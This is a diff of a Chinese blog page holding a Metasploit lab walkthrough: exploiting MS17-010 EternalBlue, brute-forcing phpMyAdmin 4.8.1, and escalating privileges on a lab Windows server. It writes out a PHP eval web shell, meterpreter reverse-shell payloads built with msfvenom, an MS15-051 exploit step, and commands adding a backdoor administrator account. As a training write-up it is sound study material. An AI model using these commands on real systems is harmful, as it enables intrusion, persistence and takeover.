@@ -18,7 +18,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  highlight: undefined,
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -161,8 +161,15 @@
 <li>Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</li>
 <li>Encoders   编码模块    将攻击载荷进行编码，来绕过防护软件拦截</li>
 </ol>
-<h2 id="初始化，不然内置的db-namp等指令用不了"><a href="#初始化，不然内置的db-namp等指令用不了" class="headerlink" title="初始化，不然内置的db_namp等指令用不了"></a>初始化，不然内置的db_namp等指令用不了</h2><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">开启数据库</span><br><span class="line">service postgresql start</span><br><span class="line">初始化数据库</span><br><span class="line">msfdb init</span><br><span class="line">开启控制台</span><br><span class="line">msfconsole</span><br><span class="line">查看数据库连接状态</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
-
+<h2 id="初始化，不然内置的db-namp等指令用不了"><a href="#初始化，不然内置的db-namp等指令用不了" class="headerlink" title="初始化，不然内置的db_namp等指令用不了"></a>初始化，不然内置的db_namp等指令用不了</h2><pre><code class="console">开启数据库
+service postgresql start
+初始化数据库
+msfdb init
+开启控制台
+msfconsole
+查看数据库连接状态
+db_status
+</code></pre>
 <h3 id="常用帮助指令"><a href="#常用帮助指令" class="headerlink" title="常用帮助指令"></a>常用帮助指令</h3><p>help&#x2F;?     帮助菜单</p>
 <p>exit 退出MSF控制台</p>
 <p>Back     返回上一级</p>
@@ -188,100 +195,290 @@
 <p><strong>受影响的系统版本</strong></p>
 <p>phpMyAdmin 4.8.0</p>
 <p>phpMyAdmin 4.8.1</p>
-<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="根据名称搜索"><a href="#根据名称搜索" class="headerlink" title="根据名称搜索"></a>根据名称搜索</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search ms17</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">  Name                                                  Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -   ----                                                  ---------------  ----     -----  -----------</span><br><span class="line">   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-01</span><br></pre></td></tr></table></figure>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="根据名称搜索"><a href="#根据名称搜索" class="headerlink" title="根据名称搜索"></a>根据名称搜索</h3><pre><code class="console">msf6 &gt; search ms17
 
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank     Check  Description
+   -   ----                                                  ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-01
+</code></pre>
 <h3 id="设置模块"><a href="#设置模块" class="headerlink" title="设置模块"></a>设置模块</h3><p>其中有exp和aux，我们先用aux进行扫描，看是否存在漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; </span><br><span class="line">也可以use+序号</span><br><span class="line">use 24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting             Required  Description</span><br><span class="line">   ----         ---------------             --------  -----------</span><br><span class="line">   CHECK_ARCH   true                        no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                        no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                       no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-fram  yes       List of named pipes to check</span><br><span class="line">                ework/data/wordlists/named</span><br><span class="line">                _pipes.txt</span><br><span class="line">   RHOSTS                                   yes       The target host(s), see https://docs.metasplo</span><br><span class="line">                                                      it.com/docs/using-metasploit/basics/using-met</span><br><span class="line">                                                      asploit.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; 
+也可以use+序号
+use 24
+msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; options
 
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting             Required  Description
+   ----         ---------------             --------  -----------
+   CHECK_ARCH   true                        no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                        no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                       no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-fram  yes       List of named pipes to check
+                ework/data/wordlists/named
+                _pipes.txt
+   RHOSTS                                   yes       The target host(s), see https://docs.metasplo
+                                                      it.com/docs/using-metasploit/basics/using-met
+                                                      asploit.html
+</code></pre>
 <p>yes的是需要设置的，no可以不用设置，有些事给你填好的</p>
 <p>RHOST：目标地址（remote）</p>
 <p>LHOST：本地地址</p>
 <h3 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><p>端口扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; db_nmap -p 445 192.168.174.157</span><br><span class="line">[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 12:43 CST</span><br><span class="line">[*] Nmap: Nmap scan report for 192.168.174.157</span><br><span class="line">[*] Nmap: Host is up (0.00036s latency).</span><br><span class="line">[*] Nmap: PORT    STATE SERVICE</span><br><span class="line">[*] Nmap: 445/tcp open  microsoft-ds</span><br><span class="line">[*] Nmap: MAC Address: 00:0C:29:4E:42:2E (VMware)</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; db_nmap -p 445 192.168.174.157
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 12:43 CST
+[*] Nmap: Nmap scan report for 192.168.174.157
+[*] Nmap: Host is up (0.00036s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: 00:0C:29:4E:42:2E (VMware)
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds
+</code></pre>
 <p>漏洞扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.174.157</span><br><span class="line">RHOST =&gt; 192.168.174.157</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.174.157
+RHOST =&gt; 192.168.174.157
+</code></pre>
 <p>如果之前有用db_namp扫描过，可以直接从hosts中读取</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hosts -R</span><br></pre></td></tr></table></figure>
+<pre><code>hosts -R
+</code></pre>
+<pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
-
+[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
 <p>返回信息提示有可能存在漏洞</p>
-<h3 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用攻击模块</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authenticatio</span><br><span class="line">                                             n. Only affects Windows Server 2008 R2, Windows 7, Win</span><br><span class="line">                                             dows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. O</span><br><span class="line">                                             nly affects Windows Server 2008 R2, Windows 7, Windows</span><br><span class="line">                                              Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affect</span><br><span class="line">                                             s Windows Server 2008 R2, Windows 7, Windows Embedded</span><br><span class="line">                                             Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.174.137  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h3><pre><code class="console">#利用攻击模块
+msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options
 
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/do
+                                             cs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authenticatio
+                                             n. Only affects Windows Server 2008 R2, Windows 7, Win
+                                             dows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. O
+                                             nly affects Windows Server 2008 R2, Windows 7, Windows
+                                              Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affect
+                                             s Windows Server 2008 R2, Windows 7, Windows Embedded
+                                             Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.174.137  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+</code></pre>
 <p>这里用hosts设置试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---           ----          -------       ---------  -----  -------  ----  --------</span><br><span class="line">192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server</span><br><span class="line">.157         42:2E         TF1           er 2008 R2</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts -R</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---           ----          -------       ---------  -----  -------  ----  --------</span><br><span class="line">192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server</span><br><span class="line">.157         42:2E         TF1           er 2008 R2</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 192.168.174.157</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.174.157  yes       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts
 
+Hosts
+=====
+
+address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments
+-------      ---           ----          -------       ---------  -----  -------  ----  --------
+192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server
+.157         42:2E         TF1           er 2008 R2
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts -R
+
+Hosts
+=====
+
+address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments
+-------      ---           ----          -------       ---------  -----  -------  ----  --------
+192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server
+.157         42:2E         TF1           er 2008 R2
+
+RHOSTS =&gt; 192.168.174.157
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         192.168.174.157  yes       The target host(s), see https://docs.metasploit.com/do
+                                             cs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+</code></pre>
 <h3 id="选择payload"><a href="#选择payload" class="headerlink" title="选择payload"></a>选择payload</h3><p>因为漏洞的利用有不同的目的，也有不同的方式，我们这里就要选择自己需要的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads</span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #   Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   -   ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0   payload/generic/custom                              .                normal  No     Custom Payload</span><br><span class="line">   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)</span><br><span class="line">   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure>
+<pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads
 
+Compatible Payloads
+===================
+
+   #   Name                                                Disclosure Date  Rank    Check  Description
+   -   ----                                                ---------------  ----    -----  -----------
+   0   payload/generic/custom                              .                normal  No     Custom Payload
+   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)
+   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline
+   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline
+</code></pre>
 <p>这里我们用reverse的，也就是反弹shell，而bind是正向的，目标服务器可能不一定支持我们去连接他，所以我们需要让他主动来连接我们，于是选择反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+</code></pre>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run
 
-<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.174.137:4444 </span><br><span class="line">[*] 192.168.174.157:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.174.157:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.174.157:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.174.157:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.174.157:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.174.157:445 - CORE raw buffer dump (51 bytes)</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard </span><br><span class="line">[*] 192.168.174.157:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000030  6b 20 31                                         k 1             </span><br><span class="line">[+] 192.168.174.157:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.174.157:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.174.157:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.174.157</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.174.137:4444 -&gt; 192.168.174.157:49163) at 2024-05-21 12:50:03 +0800</span><br><span class="line">[-] 192.168.174.157:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError</span><br></pre></td></tr></table></figure>
-
+[*] Started reverse TCP handler on 192.168.174.137:4444 
+[*] 192.168.174.157:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.174.157:445 - The target is vulnerable.
+[*] 192.168.174.157:445 - Connecting to target for exploitation.
+[+] 192.168.174.157:445 - Connection established for exploitation.
+[+] 192.168.174.157:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.174.157:445 - CORE raw buffer dump (51 bytes)
+[*] 192.168.174.157:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.174.157:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[*] 192.168.174.157:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[*] 192.168.174.157:445 - 0x00000030  6b 20 31                                         k 1             
+[+] 192.168.174.157:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.174.157:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.174.157:445 - Sending all but last fragment of exploit packet
+[*] Sending stage (201798 bytes) to 192.168.174.157
+[*] Meterpreter session 1 opened (192.168.174.137:4444 -&gt; 192.168.174.157:49163) at 2024-05-21 12:50:03 +0800
+[-] 192.168.174.157:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError
+</code></pre>
 <p>等待一会后，会进入后渗透模块meterpreter，可以使用getuid，来查看当前用户所属的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
-
+<pre><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
 <h2 id="实验环境二"><a href="#实验环境二" class="headerlink" title="实验环境二"></a>实验环境二</h2><p>创建低权限用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user qaq 123abc. /add</span><br><span class="line">net user 查看是否创建成功</span><br></pre></td></tr></table></figure>
-
+<pre><code>net user qaq 123abc. /add
+net user 查看是否创建成功
+</code></pre>
 <p>修改phpstudy进程的所有者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务-&gt;找到apache2进程-&gt;停止-&gt;属性-&gt;登录-&gt;此账户-&gt;浏览-&gt;找到qaq，输入密码应用即可</span><br></pre></td></tr></table></figure>
-
+<pre><code>服务-&gt;找到apache2进程-&gt;停止-&gt;属性-&gt;登录-&gt;此账户-&gt;浏览-&gt;找到qaq，输入密码应用即可
+</code></pre>
 <p>但启动时会报错，因为阿帕奇的log文件夹会记录apache的信息，我们需要给这个文件赋予qaq写权限，然后重启相关服务即可，访问主页试试</p>
 <p><img src="/../image/image-20240521173640201.png" alt="image-20240521173640201"></p>
 <p>进入phpmyadmin页面</p>
 <p><img src="/../image/image-20240521173736035.png" alt="image-20240521173736035"></p>
-<h3 id="扫描靶机-1"><a href="#扫描靶机-1" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search phpmyadmin</span><br><span class="line">use 1</span><br><span class="line">options #要设置三个东西</span><br><span class="line">set rhost 192.168.174.1257</span><br><span class="line">set targeturi /phpMyAdmin-4.8.1/</span><br><span class="line">set userpass_file small.txt设置密码字典</span><br><span class="line">##用户名也可以设置字典爆破</span><br><span class="line">---------------------------------</span><br><span class="line">字典可以在文件中找</span><br><span class="line">locate small.txt</span><br><span class="line">cp path /root</span><br></pre></td></tr></table></figure>
-
+<h3 id="扫描靶机-1"><a href="#扫描靶机-1" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><pre><code>search phpmyadmin
+use 1
+options #要设置三个东西
+set rhost 192.168.174.1257
+set targeturi /phpMyAdmin-4.8.1/
+set userpass_file small.txt设置密码字典
+##用户名也可以设置字典爆破
+---------------------------------
+字典可以在文件中找
+locate small.txt
+cp path /root
+</code></pre>
 <p>使用这个模块就算密码正确有时候也会失败，不好用，不如bp</p>
-<h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search phpmyadmin</span><br><span class="line">use 8</span><br><span class="line">根据前面爆破出来的密码设置即可</span><br><span class="line">run</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: qaq</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : WIN-R4FJ4HCKTF1</span><br><span class="line">OS          : Windows NT WIN-R4FJ4HCKTF1 6.1 build 7601 (Windows Server 2008 R2 Standard Edition Service Pack 1) i586</span><br><span class="line">Meterpreter : php/windows</span><br><span class="line">meterpreter &gt; getwd</span><br><span class="line">C:\phpStudy\WWW\phpMyAdmin-4.8.1</span><br></pre></td></tr></table></figure>
-
+<h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><pre><code>search phpmyadmin
+use 8
+根据前面爆破出来的密码设置即可
+run
+meterpreter &gt; getuid
+Server username: qaq
+meterpreter &gt; sysinfo
+Computer    : WIN-R4FJ4HCKTF1
+OS          : Windows NT WIN-R4FJ4HCKTF1 6.1 build 7601 (Windows Server 2008 R2 Standard Edition Service Pack 1) i586
+Meterpreter : php/windows
+meterpreter &gt; getwd
+C:\phpStudy\WWW\phpMyAdmin-4.8.1
+</code></pre>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在线比对补丁查找exp：<a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E6%98%AF%E6%A0%B9%E6%8D%AEsysinfo%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9F%A5%E6%89%BE%E7%9A%84%EF%BC%8C%E4%BD%86meterpreter%E6%B2%A1%E6%9C%89%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8D%A2%E4%B8%AA%E5%B7%A5%E5%85%B7">https://bugs.hacking8.com/tiquan/，因为这个是根据sysinfo的信息查找的，但meterpreter没有，需要换个工具</a></p>
 <p>写木马,用antsword连</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit 1.php</span><br><span class="line">&lt;?php eval($_REQUEST[123]) ?&gt;</span><br><span class="line">meterpreter &gt; ls 1.php</span><br><span class="line">100666/rw-rw-rw-  128849018910  fil  233591561222-02-03 07:15:02 +0800  1.php</span><br></pre></td></tr></table></figure>
-
+<pre><code>edit 1.php
+&lt;?php eval($_REQUEST[123]) ?&gt;
+meterpreter &gt; ls 1.php
+100666/rw-rw-rw-  128849018910  fil  233591561222-02-03 07:15:02 +0800  1.php
+</code></pre>
 <p>验证一下，访问这个页面，传一个phpinfo（）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.157/phpMyAdmin-4.8.1/1.php?123=phpinfo();</span><br></pre></td></tr></table></figure>
-
+<pre><code>http://192.168.174.157/phpMyAdmin-4.8.1/1.php?123=phpinfo();
+</code></pre>
 <p><img src="/../image/image-20240521210535033.png" alt="image-20240521210535033"></p>
 <p>蚁🗡连接</p>
 <p><img src="/../image/image-20240521213257467.png" alt="image-20240521213257467"></p>
 <p>进入命令界面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
-
+<pre><code>systeminfo
+</code></pre>
 <p><img src="/../image/image-20240521213446704.png" alt="image-20240521213446704"></p>
 <p>利用补丁号更具操作系统类型，查找exp，究竟哪一个有用，要我们一个一个去试</p>
 <h3 id="MS15-051-KB3045171"><a href="#MS15-051-KB3045171" class="headerlink" title="MS15-051-KB3045171"></a>MS15-051-KB3045171</h3><p>在文件里右键上传即可</p>
 <p><img src="/../image/image-20240521213819003.png" alt="image-20240521213819003"></p>
 <p>最好重命名一下，方便利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc.exe whami</span><br></pre></td></tr></table></figure>
-
+<pre><code>abc.exe whami
+</code></pre>
 <p><img src="/../image/image-20240521214025522.png" alt="image-20240521214025522"></p>
 <p>这时候就是系统权限的用户了，添加用户进入管理组,后续就可以利用这个用户进行渗透，也有一种隐藏用户，不容易被发现</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/123478562">https://blog.csdn.net/weixin_40412037/article/details/123478562</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc.exe net user a a.1 /add#添加用户</span><br><span class="line"></span><br><span class="line">net localgroup administrators a /add  #添加用户至管理组</span><br></pre></td></tr></table></figure>
+<pre><code>abc.exe net user a a.1 /add#添加用户
 
+net localgroup administrators a /add  #添加用户至管理组
+</code></pre>
 <h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>上传一个属于meterpreter的木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先拿一个msf的session，另开一个</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.174.137 lport=1234 -f exe  &gt; shell.exe </span><br></pre></td></tr></table></figure>
-
+<pre><code>先拿一个msf的session，另开一个
